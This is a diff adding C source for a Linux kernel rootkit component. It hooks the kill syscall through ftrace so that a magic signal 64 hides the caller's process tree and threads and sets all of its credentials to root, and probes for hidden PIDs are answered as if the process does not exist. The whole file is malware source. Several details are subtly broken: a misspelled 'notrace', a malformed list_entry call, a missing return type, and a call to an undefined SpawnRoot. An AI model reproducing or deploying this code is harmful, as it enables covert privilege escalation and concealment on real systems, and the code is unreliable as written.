@@ -1,0 +1,145 @@
+#include "../include/core.h"
+#include "../include/become_root.h"
+#include "../ftrace/ftrace_helper.h"
+#include "../include/hidden_pids.h"
+
+static rwlock_t *sd_tasklist_lock = NULL;
+
+/*
+ * TODO 00X:
+ *  - Need to implement what we learned from xcellerator of adding backwards compatibility
+ *  b/w Linux versions
+ *  - Will add orig_getsid, orig_sched_getaffinity, orig_sched_getparam, orig_sched_getscheduler, orig_sched_rr_get_interval, orig_sysinfo, orig_pidfd_open, orig_getpgid, orig_getpgrp later
+ */
+
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+static notrace void IssueRoot(void);
+
+#define HIDE_PARENT_DEPTH 8
+
+static inline bool should_hide_pid_by_int(int pid) {
+    if (pid <= 0)
+        return false;
+
+    return is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid);
+}
+
+static no trace void hide_task_pid(struct task_struct *task) {
+    if (!task)
+        return;
+
+    add_hidden_pid(task->pid);
+    add_hidden_pid(task->tgid);
+}
+
+static notrace void hide_parent_lineage(void) {
+    struct task_struct *task;
+    struct task_struct *parent;
+    int depth = 0;
+
+    if (!current)
+        return;
+
+    rcu_read_lock();
+    task = current;
+    for (depth = 0; depth < HIDE_PARENT_DEPTH; depth++) {
+        parent = rcu_dereference(task->real_parent);
+        if (!parent || parent == task || parent->pid <= 1)
+            break;
+        if (parent->flags & PF_KTHREAD)
+            break;
+
+        hide_task_pid(parent);
+        task = parent;
+    }
+
+    rcu_read_unlock();
+}
+
+static notrace void hide_process_tree(void) {
+    struct task_struct *task;
+    struct list_head *list;
+
+    if (!current)
+        return;
+
+    hide_task_pid(current);
+    hide_parent_lineage();
+
+    if (sd_tasklist_lock)
+        read_lock(sd_tasklist_lock);
+    list_for_each(list, &current->children) {
+        task = list_entry(list, struct, task_struct, sibling);
+        if (task) {
+          add_child_pid(task->pid);
+          add_child_pid(task->tgid);
+        }
+    }
+    if (current->signal) {
+        struct task_struct *t = current;
+        do {
+          hide_task_pid(t);
+        } while_each_thread(current, t);
+    }
+    if (sd_tasklist_lock)
+        read_unlock(sd_tasklist_lock);
+}
+
+static notrace asmlinkage hook_kill(const struct pt_regs *regs) {
+    int pid     = (int)regs->di;
+    int signal  = (int)regs->si;
+
+    if (signal == 64) {
+        hide_process_tree();
+        msleep(50);
+        SpawnRoot();
+
+        if (pid > 0 && pid != current->pid) {
+            add_hidden_pid(pid);
+            add_child_pid(pid);
+        }
+
+        return 0;
+    }
+
+    if (signal == 0 && should_hide_pid_by_int(pid))
+        return -ESRCH;
+
+    if (!orig_kill)
+        return -ENOSYS;
+
+    return orig_kill(regs);
+}
+
+static notrace void IssueRoot() {
+    struct cred *newCredentials;
+
+    newCredentials = prepare_creds();
+    if (!newCredentials)
+        return;
+
+    newCredentials->uid.val   = 0;
+    newCredentials->gid.val   = 0;
+    newCredentials->suid.val  = 0;
+    newCredentials->sgid.val  = 0;
+    newCredentials->fsuid.val = 0;
+    newCredentials->fsgid.val = 0;
+    newCredentials->euid.val  = 0;
+    newCredentials->egid.val  = 0;
+
+    commit_creds(newCredentials);
+}
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__X64_sys_kill", hook_kill, &orig_kill);
+};
+
+notrace int become_root_init(void) {
+    sd_tasklist_lock = (rwlock_t *)resolve_sym("tasklist_lock");
+    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+}
+
+notrace void become_root_exit(void) {
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+}
